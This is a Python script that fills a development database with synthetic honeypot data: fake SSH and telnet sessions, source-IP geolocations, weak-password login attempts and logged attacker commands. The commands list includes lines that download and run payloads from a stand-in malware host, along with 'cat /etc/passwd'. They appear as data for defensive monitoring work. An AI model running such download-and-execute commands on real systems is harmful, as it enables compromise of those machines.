"""Seed the dev database with synthetic honeypot data.

By default it WIPES every table first and then inserts data

    just seed                 # default: wipe all, big trend
    just seed --no-wipe       # append on top of existing data instead
    just seed --current 2000 --previous 1500   # a calmer trend

The data is deterministic for a given --rng-seed so reruns are reproducible.
"""

from __future__ import annotations

import argparse
import random
from datetime import datetime, timedelta, timezone
from typing import Any

from sqlalchemy import create_engine, insert, text
from sqlalchemy.orm import DeclarativeBase
from sqlalchemy.orm import Session as DbSession

from src.config import Config
from src.models import AuthAttempt, Command, GeoLocation, Session

# Sensor name stamped on every generated session, so seed-origin rows are
# distinguishable from real ingested ones (e.g. when seeding with --no-wipe).
SEED_SENSOR = "seed"

HONEYPOT_IP = "10.0.0.1"

# Weights skew toward the usual suspects.
COUNTRIES: list[tuple[str, str, float, float, int]] = [
    ("CN", "China", 35.0, 105.0, 30),
    ("US", "United States", 38.0, -97.0, 20),
    ("RU", "Russia", 60.0, 90.0, 15),
    ("IN", "India", 22.0, 78.0, 10),
    ("BR", "Brazil", -10.0, -55.0, 8),
    ("DE", "Germany", 51.0, 9.0, 6),
    ("NL", "Netherlands", 52.0, 5.0, 5),
    ("KR", "South Korea", 36.0, 128.0, 4),
    ("VN", "Vietnam", 16.0, 108.0, 4),
    ("GB", "United Kingdom", 54.0, -2.0, 3),
]

AS_ORGS = [
    "Amazon.com Inc.",
    "DigitalOcean LLC",
    "OVH SAS",
    "Hetzner Online GmbH",
    "China Telecom",
    "Google LLC",
    "Contabo GmbH",
    "Tencent Cloud",
]

USERNAMES = ["root", "admin", "user", "test", "oracle", "postgres", "ubuntu", "git"]
PASSWORDS = [
    "123456",
    "password",
    "admin",
    "root",
    "12345678",
    "qwerty",
    "1234",
    "P@ssw0rd",
    "changeme",
    "toor",
]
COMMANDS = [
    "uname -a",
    "cat /proc/cpuinfo",
    "wget http://malware.example/x.sh",
    "curl -O http://malware.example/bot",
    "whoami",
    "ls -la",
    "cat /etc/passwd",
    "chmod +x x.sh",
    "./x.sh",
    "ps aux",
]


def make_ip(rng: random.Random) -> str:
    """A random, public-looking IPv4 (avoids the obvious private ranges)."""
    while True:
        first = rng.randint(1, 223)
        if first in (10, 127, 169, 172, 192):
            continue
        rest = ".".join(str(rng.randint(0, 255)) for _ in range(2))
        return f"{first}.{rest}.{rng.randint(1, 254)}"


def build_ip_pool(rng: random.Random, size: int) -> list[str]:
    """A deterministic set of unique source IPs of the requested size."""
    pool: set[str] = set()
    while len(pool) < size:
        pool.add(make_ip(rng))
    return sorted(pool)


def geo_rows(rng: random.Random, ips: list[str]) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    weights = [c[4] for c in COUNTRIES]
    for ip in ips:
        code, name, lat, lon, _ = rng.choices(COUNTRIES, weights=weights, k=1)[0]
        rows.append(
            {
                "ip": ip,
                "country_code": code,
                "country": name,
                "city": None,
                "latitude": lat + rng.uniform(-3, 3),
                "longitude": lon + rng.uniform(-3, 3),
                "asn": rng.randint(1000, 65000),
                "as_org": rng.choice(AS_ORGS),
                "last_updated": datetime.now(timezone.utc),
            }
        )
    return rows


def session_rows(
    rng: random.Random,
    ips: list[str],
    count: int,
    window_start: datetime,
    window_span: timedelta,
    start_index: int,
) -> list[dict[str, Any]]:
    """`count` sessions with `started_at` uniformly spread across one window."""
    span = window_span.total_seconds()
    rows: list[dict[str, Any]] = []
    for i in range(count):
        started = window_start + timedelta(seconds=rng.uniform(0, span))
        duration = rng.uniform(1, 600)
        proto = "telnet" if rng.random() < 0.15 else "ssh"
        rows.append(
            {
                "id": f"seed-{start_index + i:07d}",
                "src_ip": rng.choice(ips),
                "src_port": rng.randint(1024, 65535),
                "dst_ip": HONEYPOT_IP,
                "dst_port": 23 if proto == "telnet" else 22,
                "protocol": proto,
                "started_at": started,
                "ended_at": started + timedelta(seconds=duration),
                "sensor": SEED_SENSOR,
            }
        )
    return rows


def child_rows(
    rng: random.Random,
    sessions: list[dict[str, Any]],
) -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
    """Auth attempts (~1 per session) and commands (for a fraction of them)."""
    auth: list[dict[str, Any]] = []
    cmds: list[dict[str, Any]] = []
    for s in sessions:
        sid = s["id"]
        started = s["started_at"]
        # ~1 attempt per session (matches prod's auth ~ sessions ratio): mostly
        # one, a few with none, a rare double. Avg ~0.98.
        roll = rng.random()
        n_auth = 0 if roll < 0.04 else 2 if roll > 0.98 else 1
        for j in range(n_auth):
            auth.append(
                {
                    "session_id": sid,
                    "username": rng.choice(USERNAMES),
                    "password": rng.choice(PASSWORDS),
                    "success": rng.random() < 0.02,
                    "timestamp": started + timedelta(seconds=j + rng.uniform(0, 2)),
                }
            )
        if rng.random() < 0.3:
            for k in range(rng.randint(1, 3)):
                cmds.append(
                    {
                        "session_id": sid,
                        "input": rng.choice(COMMANDS),
                        "success": True,
                        "timestamp": started + timedelta(seconds=5 + k),
                    }
                )
    return auth, cmds


def bulk_insert(
    db: DbSession,
    model: type[DeclarativeBase],
    rows: list[dict[str, Any]],
    size: int = 5000,
) -> None:
    """Insert dict rows in chunks via 2.0-style executemany."""
    for i in range(0, len(rows), size):
        db.execute(insert(model), rows[i : i + size])


def wipe_all(db: DbSession) -> None:
    """Truncate all honeypot tables for a clean slate.

    TRUNCATE CASCADE clears child tables; RESTART IDENTITY resets PKs for reruns.
    Dev-only—never run on production.
    """
    db.execute(text("TRUNCATE TABLE sessions, geo_locations RESTART IDENTITY CASCADE"))
    db.commit()


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument(
        "--current",
        type=int,
        default=17017,
        help="sessions in the last 7 days (default: 17017)",
    )
    p.add_argument(
        "--previous",
        type=int,
        default=885,
        help="sessions in the prior 7-day window (default: 885)",
    )
    p.add_argument(
        "--unique-ips",
        type=int,
        default=733,
        help="size of the source-IP pool (default: 733)",
    )
    p.add_argument(
        "--period-days",
        type=int,
        default=7,
        help="length of each trend window in days (default: 7)",
    )
    p.add_argument(
        "--rng-seed",
        type=int,
        default=1337,
        help="RNG seed for reproducible data (default: 1337)",
    )
    p.add_argument(
        "--wipe",
        action=argparse.BooleanOptionalAction,
        default=True,
        help="truncate ALL tables before seeding for a clean slate "
        "(default: --wipe); pass --no-wipe to append instead",
    )
    return p.parse_args()


def main() -> None:
    args = parse_args()
    rng = random.Random(args.rng_seed)

    now = datetime.now(timezone.utc)
    period = timedelta(days=args.period_days)
    cur_start = now - period
    prev_start = cur_start - period

    ips = build_ip_pool(rng, args.unique_ips)
    sessions = session_rows(rng, ips, args.current, cur_start, period, 0)
    sessions += session_rows(rng, ips, args.previous, prev_start, period, args.current)
    auth, cmds = child_rows(rng, sessions)
    geos = geo_rows(rng, ips)

    engine = create_engine(Config.SQLALCHEMY_DATABASE_URI)
    with DbSession(engine) as db:
        if args.wipe:
            wipe_all(db)
        bulk_insert(db, GeoLocation, geos)
        bulk_insert(db, Session, sessions)
        bulk_insert(db, AuthAttempt, auth)
        bulk_insert(db, Command, cmds)
        db.commit()

    total = args.current + args.previous
    pct = (
        f"{(args.current - args.previous) / args.previous * 100:.1f}%"
        if args.previous
        else "n/a (prior window empty)"
    )
    print(
        f"Seeded {total} sessions ({len(auth)} auth, {len(cmds)} commands, "
        f"{len(ips)} unique IPs)."
    )
    print(
        f"Trend (7d): current={args.current} previous={args.previous} "
        f"delta=+{args.current - args.previous} pct_change={pct}"
    )


if __name__ == "__main__":
    main()
